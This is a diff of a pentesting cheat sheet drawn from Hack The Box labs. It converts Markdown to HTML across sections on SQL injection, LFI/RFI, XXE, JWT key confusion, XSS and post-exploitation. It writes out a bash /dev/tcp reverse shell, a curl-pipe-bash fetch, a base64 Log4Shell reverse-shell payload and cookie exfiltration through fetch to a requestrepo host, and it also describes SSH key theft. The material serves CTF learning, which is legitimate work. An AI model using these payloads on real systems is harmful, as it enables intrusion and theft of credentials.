+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">members</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span>
+</code></pre></div></div>
 
-therefore, the query is no longer checking for password and the login page is bypassed.
+<p>therefore, the query is no longer checking for password and the login page is bypassed.</p>
 
-```
-username: admin&apos;#
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username: admin'#
 password: admin123 (any password will do the trick)
-```
+</code></pre></div></div>
 
-You can find more SQL injections here: &lt;a href=&quot;https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/&quot;&gt;https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/&lt;/a&gt;
+<p>You can find more SQL injections here: <a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/</a></p>
 
-Pay attention when breaking the rest of the query with comments. The standard comment `--` might not always work, it&apos;s worth trying another kind of comments like `#`
+<p>Pay attention when breaking the rest of the query with comments. The standard comment <code class="language-plaintext highlighter-rouge">--</code> might not always work, it’s worth trying another kind of comments like <code class="language-plaintext highlighter-rouge">#</code></p>
 
-#### Server side template injection &lt;a name=&quot;ssti&quot;&gt;&lt;/a&gt;
+<h4 id="server-side-template-injection-">Server side template injection <a name="ssti"></a></h4>
 
-if you see a search form and you type something and you see the output of what you typed again in the webpage, the webpage might be susceptible for SSTI. Try to identify which template engine and search how to exploit it.
+<p>if you see a search form and you type something and you see the output of what you typed again in the webpage, the webpage might be susceptible for SSTI. Try to identify which template engine and search how to exploit it.</p>
 
-If the target is using a templating engine, it is possible to use the template injection to execute commands in the server.
+<p>If the target is using a templating engine, it is possible to use the template injection to execute commands in the server.</p>
 
-One easy way to test that is to put something like \{\{7*7}} in the template and check for the result.
+<p>One easy way to test that is to put something like {{7*7}} in the template and check for the result.</p>
 
-If the template executes, we&apos;ll see the result, out of luck we will see nothing. Or maybe we&apos;ll see some trace that reveals the technology behind.
+<p>If the template executes, we’ll see the result, out of luck we will see nothing. Or maybe we’ll see some trace that reveals the technology behind.</p>
 
-#### Arbitrary file upload &lt;a name=&quot;arbitrary-file-upload&quot;&gt;&lt;/a&gt;
+<h4 id="arbitrary-file-upload-">Arbitrary file upload <a name="arbitrary-file-upload"></a></h4>
 
-This is a very interesting vulnerability. It lets the attacker upload some file to the server. You can do this to start a reverse shell. That is the targeted machine establish a permanent connection to the attacker machine and it provides a shell where the attacker can run commands if it was inside the machine.
+<p>This is a very interesting vulnerability. It lets the attacker upload some file to the server. You can do this to start a reverse shell. That is the targeted machine establish a permanent connection to the attacker machine and it provides a shell where the attacker can run commands if it was inside the machine.</p>
 
+<h4 id="local-file-include-lfi-">Local File Include (LFI) <a name="lfi"></a></h4>
 
-#### Local File Include (LFI) &lt;a name=&quot;lfi&quot;&gt;&lt;/a&gt;
+<p>Abuse of file loading capability (for instance PHP include function) to show a local file in the browser:</p>
 
-Abuse of file loading capability (for instance PHP include function) to show a local file in the browser:
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts
+</code></pre></div></div>
 
-```
-http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts
-```
-
-You can try to read the following files for Linux:
-```
-/etc/hosts
+<p>You can try to read the following files for Linux:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/hosts
 /etc/passwd
-```
+</code></pre></div></div>
 
-and for Windows:
-```
-C:/Windows/System32/drivers/etc/hosts
+<p>and for Windows:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:/Windows/System32/drivers/etc/hosts
 c:/windows/win.ini
-```
+</code></pre></div></div>
 
-#### Remote File Include (RFI) &lt;a name=&quot;rfi&quot;&gt;&lt;/a&gt;
+<h4 id="remote-file-include-rfi-">Remote File Include (RFI) <a name="rfi"></a></h4>
 
-Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts.
+<p>Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts.</p>
 
-This can be use to force the target make a call to a compromised host in the same network and captura the credentials challenge:
+<p>This can be use to force the target make a call to a compromised host in the same network and captura the credentials challenge:</p>
 
-```
-http://unika.htb/index.php?page=\\10.1.2.3\blabla\
-```
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://unika.htb/index.php?page=\\10.1.2.3\blabla\
+</code></pre></div></div>
 
-#### Reverse shell &lt;a name=&quot;reverse-shell&quot;&gt;&lt;/a&gt;
+<h4 id="reverse-shell-">Reverse shell <a name="reverse-shell"></a></h4>
 
-Reverse basically means that it is the target that will initiate a connection request back us (the attacker). 
+<p>Reverse basically means that it is the target that will initiate a connection request back us (the attacker).</p>
 
-For example, once we have remote code execution in the target, we&apos;ll be able to download and execute a piece of code.
+<p>For example, once we have remote code execution in the target, we’ll be able to download and execute a piece of code.</p>
 
-Usually the process is:
-- Create a file in the attacker machine containing a reverse shell payload:
-```bash
-#!/bin/bash
-bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP_ADDRESS&gt;/1337 0&gt;&amp;1
-```
-- Create a server in the attacker machine which will act as the shell I/O. Normally this is done with `netcat`.
-```bash
-nc -nvlp 1337
-```
-- Start a webserver in the attacker machine that will server the reserve shell payload. You can do that with python (in the same directory as the payload):
-```bash
-python3 -m http.server 8000
-```
-- Make the target machine download and execute the reverse shell payload:
-```
-http://thetoppers.htb/shell.php?cmd=curl%20%3CYOUR_IP_ADDRESS%3E:8000/shell.sh|bash
-```
+<p>Usually the process is:</p>
+<ul>
+  <li>Create a file in the attacker machine containing a reverse shell payload:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;YOUR_IP_ADDRESS&gt;/1337 0&gt;&amp;1
+</code></pre></div>    </div>
+  </li>
+  <li>Create a server in the attacker machine which will act as the shell I/O. Normally this is done with <code class="language-plaintext highlighter-rouge">netcat</code>.
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nvlp</span> 1337
+</code></pre></div>    </div>
+  </li>
+  <li>Start a webserver in the attacker machine that will server the reserve shell payload. You can do that with python (in the same directory as the payload):
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8000
+</code></pre></div>    </div>
+  </li>
+  <li>Make the target machine download and execute the reverse shell payload:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://thetoppers.htb/shell.php?cmd=curl%20%3CYOUR_IP_ADDRESS%3E:8000/shell.sh|bash
+</code></pre></div>    </div>
+  </li>
+</ul>
 
-You can find a list of reverse shells here: &lt;a href=&quot;https://www.revshells.com/&quot;&gt;https://www.revshells.com/&lt;/a&gt;
+<p>You can find a list of reverse shells here: <a href="https://www.revshells.com/">https://www.revshells.com/</a></p>
 
-Once you have shell access, you can try to get a improve the shell if python is installed:
+<p>Once you have shell access, you can try to get a improve the shell if python is installed:</p>
 
-```bash
-python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;
-```
-or
-```bash
-script /dev/null -c bash
-```
-or
-```bash
-python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+<p>or</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null <span class="nt">-c</span> bash
+</code></pre></div></div>
+<p>or</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
 CTRL+Z
-stty raw -echo
-fg
-export TERM=xterm
-```
+<span class="nb">stty </span>raw <span class="nt">-echo</span>
+<span class="nb">fg
+export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div></div>
 
+<p>Or, you can find mmore methods to improve the shell here: <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p>
 
-Or, you can find mmore methods to improve the shell here: &lt;a href=&quot;https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/&quot;&gt;https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/&lt;/a&gt;
+<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>
 
-For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;
+<h4 id="rogue-servers-">Rogue servers <a name="rogue"></a></h4>
 
-#### Rogue servers &lt;a name=&quot;rogue&quot;&gt;&lt;/a&gt;
+<p>The idea of rogue server is to start a server in the attacker machine and make the target machine speaks with the attacker server. This is used for instance to retrieve NTLM hash challenge or to explot log4j vulnerability.</p>
 
-The idea of rogue server is to start a server in the attacker machine and make the target machine speaks with the attacker server. This is used for instance to retrieve NTLM hash challenge or to explot log4j vulnerability.
+<h5 id="ntlm-">NTLM <a name="ntlm"></a></h5>
 
-##### NTLM &lt;a name=&quot;ntlm&quot;&gt;&lt;/a&gt;
+<p>Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.</p>
 
-Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.
+<p>In order to mess with it, you might use the <a href="https://github.com/lgandx/Responder">responder tool</a></p>
 
-In order to mess with it, you might use the &lt;a href=&quot;https://github.com/lgandx/Responder&quot;&gt;responder tool&lt;/a&gt;
+<p>The idea to bypass the NTLM is to force the target authenticate against a rogue SMB server (provided by <code class="language-plaintext highlighter-rouge">responder</code> tool). This tool will capture the authentication challenge hash and then you can use <code class="language-plaintext highlighter-rouge">john</code> tool to compare the hash with a dictionary to see if any entry matches.</p>
 
-The idea to bypass the NTLM is to force the target authenticate against a rogue SMB server (provided by `responder` tool). This tool will capture the authentication challenge hash and then you can use `john` tool to compare the hash with a dictionary to see if any entry matches.
+<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>
 
-For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;
+<h5 id="log4jshell-">Log4jShell <a name="log4j-shell"></a></h5>
 
-##### Log4jShell &lt;a name=&quot;log4j-shell&quot;&gt;&lt;/a&gt;
+<p>It was discovered that log4j libraries for certain versions were vulnerable to remote code execution. In order to do so, you setup a rogue JNDI/LDAP server from <a href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a>in the attacker machine and send a JNDI command to the target machine to communicate with the rogue LDAP server to get a revershe shell on the attacker machine.</p>
 
-It was discovered that log4j libraries for certain versions were vulnerable to remote code execution. In order to do so, you setup a rogue JNDI/LDAP server from &lt;a href=&quot;https://github.com/veracode-research/rogue-jndi&quot;&gt;https://github.com/veracode-research/rogue-jndi&lt;/a&gt;in the attacker machine and send a JNDI command to the target machine to communicate with the rogue LDAP server to get a revershe shell on the attacker machine.
+<p>E.g.:</p>
 
-E.g.:
-
-```bash
-java -jar target/RogueJndi-1.1.jar --command &quot;bash -c
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> target/RogueJndi-1.1.jar <span class="nt">--command</span> <span class="s2">"bash -c
 {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,-
-d}|{bash,-i}&quot; --hostname &quot;10.10.14.33&quot;
-```
-Start the rogue JNDI server that will start a reverse shell on 10.10.14.33 using the base64 payload provided.
+d}|{bash,-i}"</span> <span class="nt">--hostname</span> <span class="s2">"10.10.14.33"</span>
+</code></pre></div></div>
+<p>Start the rogue JNDI server that will start a reverse shell on 10.10.14.33 using the base64 payload provided.</p>
 
-Then, send the payload to force the target machine connect the rogue JNDI/LDAP server:
+<p>Then, send the payload to force the target machine connect the rogue JNDI/LDAP server:</p>
 
-```
-${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}
-```
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}
+</code></pre></div></div>
 
+<h4 id="search-for-vulnerabilities-">Search for vulnerabilities <a name="search-vuln"></a></h4>
 
-#### Search for vulnerabilities &lt;a name=&quot;search-vuln&quot;&gt;&lt;/a&gt;
+<p>If you can establish the version of the service running, you can query for any known vulnerability of that version:</p>
 
-If you can establish the version of the service running, you can query for any known vulnerability of that version:
+<p><a href="https://cve.mitre.org/cve/search_cve_list.html">https://cve.mitre.org/cve/search_cve_list.html</a></p>
 
-&lt;a href=&quot;https://cve.mitre.org/cve/search_cve_list.html&quot;&gt;https://cve.mitre.org/cve/search_cve_list.html&lt;/a&gt;
+<h4 id="xml-external-entities-">XML eXternal Entities <a name="xxe"></a></h4>
 
+<p>If the application is using XML to process any input data, it might be vulnerable to this kind of attacks.</p>
 
-#### XML eXternal Entities &lt;a name=&quot;xxe&quot;&gt;&lt;/a&gt;
+<p>This attack works because the XML parser usually are configured with support for XML external entities. This is a feature of XML to be able to define objects outside the defined structure, but can be abuse to list internal files or to make connections to the outside of the target machine.</p>
 
-If the application is using XML to process any input data, it might be vulnerable to this kind of attacks.
+<p>In order to check if the machine is vulnerable to this attack, you can try to show the contents of <code class="language-plaintext highlighter-rouge">/etc/hosts</code>(Linux) or <code class="language-plaintext highlighter-rouge">C:/Windows/System32/drivers/etc/hosts</code>(Windows). e.g.:</p>
 
-This attack works because the XML parser usually are configured with support for XML external entities. This is a feature of XML to be able to define objects outside the defined structure, but can be abuse to list internal files or to make connections to the outside of the target machine.
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version = "1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts" &gt;</span>]&gt;
+<span class="nt">&lt;order&gt;&lt;quantity&gt;</span>2<span class="nt">&lt;/quantity&gt;&lt;item&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/item&gt;&lt;address&gt;</span>Fake street 1234<span class="nt">&lt;/address&gt;&lt;/order&gt;</span>
+</code></pre></div></div>
 
-In order to check if the machine is vulnerable to this attack, you can try to show the contents of `/etc/hosts`(Linux) or `C:/Windows/System32/drivers/etc/hosts`(Windows). e.g.:
+<h4 id="jwt-key-confussion-attack-">JWT Key confussion attack <a name="jwt-confussion"></a></h4>
 
-```xml
-&lt;?xml version = &quot;1.0&quot;?&gt;
-&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot; &gt;]&gt;
-&lt;order&gt;&lt;quantity&gt;2&lt;/quantity&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;address&gt;Fake street 1234&lt;/address&gt;&lt;/order&gt;
-```
+<p>JWT Tokens are a way to sign and verify tokens that can contain important data such as credencials, roles, etc…</p>
 
-#### JWT Key confussion attack &lt;a name=&quot;jwt-confussion&quot;&gt;&lt;/a&gt;
+<p>They have two ways of working: asymetric (RSA) and symmetric. In asymetric the token is signed with the private key and can be verified with the public key. In symmetric, the token is signed with a shared secret.</p>
 
-JWT Tokens are a way to sign and verify tokens that can contain important data such as credencials, roles, etc...
+<p>This signing and verifing is very important because it ensures that nobody modifies the tokens.</p>
 
-They have two ways of working: asymetric (RSA) and symmetric. In asymetric the token is signed with the private key and can be verified with the public key. In symmetric, the token is signed with a shared secret.
+<p>However, for old unsecure version of the libraries that handles this, it is possible to modify the payload and sign with the public key (if you are lucky enough to get it). When we change the signing algorithm, we are telling the other side that we’re using symmetric algorithm.</p>
 
-This signing and verifing is very important because it ensures that nobody modifies the tokens.
+<p>See the following example:</p>
 
-However, for old unsecure version of the libraries that handles this, it is possible to modify the payload and sign with the public key (if you are lucky enough to get it). When we change the signing algorithm, we are telling the other side that we&apos;re using symmetric algorithm.
+<p>In the received side, the token is verified using symmetric and asymmetric algorithms:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="nx">decode</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="p">(</span><span class="k">await</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span> <span class="na">algorithms</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">RS256</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">HS256</span><span class="dl">'</span><span class="p">]</span> <span class="p">}));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>First, it will try with RSA (RS) and later with Hash (HS) if the previous fails.</p>
 
-See the following example:
+<p>This way in the client side, we can modify the payload and sign the payload by changing the signing algorithm:</p>
 
-In the received side, the token is verified using symmetric and asymmetric algorithms:
-```javascript
-async decode(token) {
-    return (await jwt.verify(token, publicKey, { algorithms: [&apos;RS256&apos;, &apos;HS256&apos;] }));
-}
-```
-First, it will try with RSA (RS) and later with Hash (HS) if the previous fails.
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">jsonwebtoken</span><span class="dl">'</span><span class="p">);</span>
 
-This way in the client side, we can modify the payload and sign the payload by changing the signing algorithm:
+<span class="kd">const</span> <span class="nx">publicKey</span>  <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">./public.key</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">utf8</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">validJwtToken</span>  <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">./jwt-token.txt</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">utf8</span><span class="dl">'</span><span class="p">);</span>
 
-```javascript
-const fs = require(&apos;fs&apos;);
-const jwt = require(&apos;jsonwebtoken&apos;);
+<span class="nx">decoded</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">validJwtToken</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span> <span class="na">algorithms</span><span class="p">:</span> <span class="p">[</span><span class="dl">"</span><span class="s2">RS256</span><span class="dl">"</span><span class="p">]})</span>
+<span class="nx">decoded</span><span class="p">[</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">admin' AND 1=2 UNION SELECT 1,top_secret_flaag,3 FROM flag_storage  -- -</span><span class="dl">"</span>
+<span class="nx">re_encoded</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">(</span><span class="nx">decoded</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span><span class="na">algorithm</span><span class="p">:</span> <span class="dl">'</span><span class="s1">HS256</span><span class="dl">'</span><span class="p">})</span>
 
-const publicKey  = fs.readFileSync(&apos;./public.key&apos;, &apos;utf8&apos;);
-const validJwtToken  = fs.readFileSync(&apos;./jwt-token.txt&apos;, &apos;utf8&apos;);
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">re_encoded</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Here, we are using the public key to verify the received token, as the regular way.</p>
 
-decoded = jwt.verify(validJwtToken, publicKey, { algorithms: [&quot;RS256&quot;]})
-decoded[&quot;username&quot;] = &quot;admin&apos; AND 1=2 UNION SELECT 1,top_secret_flaag,3 FROM flag_storage  -- -&quot;
-re_encoded = jwt.sign(decoded, publicKey, {algorithm: &apos;HS256&apos;})
+<p>Then, we change the payload and we sign again to generate the JWT. We use the public key and we change the algorithm to Hash. This way the received will verify the token using the public key. It will first fail with the asymmetric but it will work with the symmetric algorithm.</p>
 
-console.log(re_encoded)
-```
-Here, we are using the public key to verify the received token, as the regular way.
+<p>In this case, we are modifying the token to retrieve something from the database using an SQL injection.</p>
 
-Then, we change the payload and we sign again to generate the JWT. We use the public key and we change the algorithm to Hash. This way the received will verify the token using the public key. It will first fail with the asymmetric but it will work with the symmetric algorithm.
+<h4 id="cross-site-scripting-xss-">Cross-Site Scripting (XSS) <a name="xss"></a></h4>
 
+<p>This is a massive vulnerability. It consist on a web application accepting input from the user. If the input is not sanitized, the attacker might be able to write HTML in the input form. This HTML can include malicious javascript code.</p>
 
-In this case, we are modifying the token to retrieve something from the database using an SQL injection.
+<p>Let’s imagine we have an application with a form with no sanitized input. On another view we list that input. An attacker can place JS code that will be executed in the other view.</p>
 
-#### Cross-Site Scripting (XSS) &lt;a name=&quot;xss&quot;&gt;&lt;/a&gt;
+<p>E.g.</p>
+<ol>
+  <li>Create a payload file that will send the interesting data (in our case, we want to extract something from the cookie):
+    <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://ojm5l9c8.requestrepo.com/?</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Write the XSS HTML code in the input form field:
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">https://cdn.jsdelivr.net/gh/adriangalera/htb-cursed-secret-party-xss@master/xss.js</span><span class="nt">&gt;&lt;/script&gt;</span>
+</code></pre></div>    </div>
+  </li>
+  <li>In the remote url (requestrepo), you’ll see the value of the <code class="language-plaintext highlighter-rouge">document.cookie</code></li>
+</ol>
 
-This is a massive vulnerability. It consist on a web application accepting input from the user. If the input is not sanitized, the attacker might be able to write HTML in the input form. This HTML can include malicious javascript code.
+<p>There’s a security header in modern browsers to prevent this <code class="language-plaintext highlighter-rouge">Content Security Policy (CSP)</code>. However, if you are unlucky enough to include a CDN in that header, you are still vulnerable since one can put arbitrary code in the CDN.</p>
 
-Let&apos;s imagine we have an application with a form with no sanitized input. On another view we list that input. An attacker can place JS code that will be executed in the other view.
+<h3 id="foothold-we-are-in-">Foothold, we are in <a name="foothold"></a></h3>
 
-E.g.
-1. Create a payload file that will send the interesting data (in our case, we want to extract something from the cookie):
-```js
-fetch(&quot;https://ojm5l9c8.requestrepo.com/?&quot; + document.cookie);
-```
-2. Write the XSS HTML code in the input form field:
-```html
-&lt;script src=https://cdn.jsdelivr.net/gh/adriangalera/htb-cursed-secret-party-xss@master/xss.js&gt;&lt;/script&gt;
-```
-3. In the remote url (requestrepo), you&apos;ll see the value of the `document.cookie`
+<p>At this point we have shell (or reverse) access to the target machine. We can start to do some interesting stuff:</p>
 
-There&apos;s a security header in modern browsers to prevent this `Content Security Policy (CSP)`. However, if you are unlucky enough to include a CDN in that header, you are still vulnerable since one can put arbitrary code in the CDN.
+<h4 id="list-users-and-groups-">List users and groups <a name="list-users"></a></h4>
 
-### Foothold, we are in &lt;a name=&quot;foothold&quot;&gt;&lt;/a&gt;
+<p>You can query all the available users in the target by querying <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>
 
-At this point we have shell (or reverse) access to the target machine. We can start to do some interesting stuff:
+<p>To retrieve the details about the current shell user, you can do <code class="language-plaintext highlighter-rouge">id</code> command. It will list the groups that the user belong. This might be useful for privilege escalation.</p>
 
-#### List users and groups &lt;a name=&quot;list-users&quot;&gt;&lt;/a&gt;
+<p>You can also list the binaries the user or group has access:</p>
 
-You can query all the available users in the target by querying `/etc/passwd`.
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-group</span> bugtracker 2&gt;/dev/null
+</code></pre></div></div>
 
-To retrieve the details about the current shell user, you can do `id` command. It will list the groups that the user belong. This might be useful for privilege escalation.
+<h4 id="search-for-interesting-keywords-">Search for interesting keywords <a name="search-keywords"></a></h4>
 
-You can also list the binaries the user or group has access:
+<p>You can search inside the contents of files for interesting contents (passwords):</p>
 
-```bash
-find / -group bugtracker 2&gt;/dev/null
-```
+<p>Let’s image someone decided to hardcode a username/password in one file in a web server. You can find it checking the files one by one or, you can use grep to search all files for interesting keywords:</p>
 
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-Ril</span> <span class="s1">'passwd*'</span> /var/www/html
+</code></pre></div></div>
 
-
-#### Search for interesting keywords &lt;a name=&quot;search-keywords&quot;&gt;&lt;/a&gt;
-
-You can search inside the contents of files for interesting contents (passwords):
-
-Let&apos;s image someone decided to hardcode a username/password in one file in a web server. You can find it checking the files one by one or, you can use grep to search all files for interesting keywords:
-
-```bash
-grep -Ril &apos;passwd*&apos; /var/www/html
-```
-
--R recursive
+<p>-R recursive
 -i ignore case
--l show the file, not the match
+-l show the file, not the match</p>
 
-#### Local port forwarding &lt;a name=&quot;local-port-forwarding&quot;&gt;&lt;/a&gt;
+<h4 id="local-port-forwarding-">Local port forwarding <a name="local-port-forwarding"></a></h4>
 
-Imagine you gain access to a machine which is running a service only for localhost. You can make that service available outside localhost by doing local port forwarding. e.g funnel.htb server is running postgres on port 5432.
+<p>Imagine you gain access to a machine which is running a service only for localhost. You can make that service available outside localhost by doing local port forwarding. e.g funnel.htb server is running postgres on port 5432.</p>
 
-With the next command, we&apos;ll do a SSH tunnel between localhost:5432 and funnel.htb:5432 port
+<p>With the next command, we’ll do a SSH tunnel between localhost:5432 and funnel.htb:5432 port</p>
 
-```bash
-ssh -L 5432:localhost:5432 christine@funnel.htb
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> 5432:localhost:5432 christine@funnel.htb
+</code></pre></div></div>
 
-#### Lateral movement &lt;a name=&quot;lateral-movement&quot;&gt;&lt;/a&gt;
+<h4 id="lateral-movement-">Lateral movement <a name="lateral-movement"></a></h4>
 
-Normally when the attacker get shell acess, the user has very few permissions. The attacker should check for credentials (inside database, inside files), etc... to switch from a low-permission user to a user with more permissions. That&apos;s called lateral movement and it&apos;s a step forward privilege escalation.
+<p>Normally when the attacker get shell acess, the user has very few permissions. The attacker should check for credentials (inside database, inside files), etc… to switch from a low-permission user to a user with more permissions. That’s called lateral movement and it’s a step forward privilege escalation.</p>
 
-#### Search for SSH keys &lt;a name=&quot;ssh-keys&quot;&gt;&lt;/a&gt;
+<h4 id="search-for-ssh-keys-">Search for SSH keys <a name="ssh-keys"></a></h4>
 
-Once we got shell access to a machine, it might be worth to try to retrieve the SSH private keys for the user. In order to do so, we must check the `.ssh` folder in the user home:
+<p>Once we got shell access to a machine, it might be worth to try to retrieve the SSH private keys for the user. In order to do so, we must check the <code class="language-plaintext highlighter-rouge">.ssh</code> folder in the user home:</p>
 
-```
-/home/michael/.ssh/id_rsa
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/michael/.ssh/id_rsa
 c/users/daniel/.ssh/id_rsa
-```
+</code></pre></div></div>
 
-Paste the contents of that private key into the attacker machine and run:
-```
-chmod 4000 michael-id-rsa
+<p>Paste the contents of that private key into the attacker machine and run:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod 4000 michael-id-rsa
 ssh -i michael-id-rsa michael@target.htb
-```
+</code></pre></div></div>
 
+<h3 id="privilege-escalation-">Privilege escalation <a name="privilege-escalation"></a></h3>
 
-### Privilege escalation &lt;a name=&quot;privilege-escalation&quot;&gt;&lt;/a&gt;
+<p>At this point we have shell (or reverse) access to the target machine, however, want to achieve root (or Administrator) access to the target machine. The mecanism might differ depending on the application or OS we’re exploting.</p>
 
-At this point we have shell (or reverse) access to the target machine, however, want to achieve root (or Administrator) access to the target machine. The mecanism might differ depending on the application or OS we&apos;re exploting.
+<h3 id="privilege-escalation-on-windows-">Privilege escalation on Windows <a name="privilege-escalation-windows"></a></h3>
 
-### Privilege escalation on Windows &lt;a name=&quot;privilege-escalation-windows&quot;&gt;&lt;/a&gt;
+<p>You can use <a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a>.</p>
 
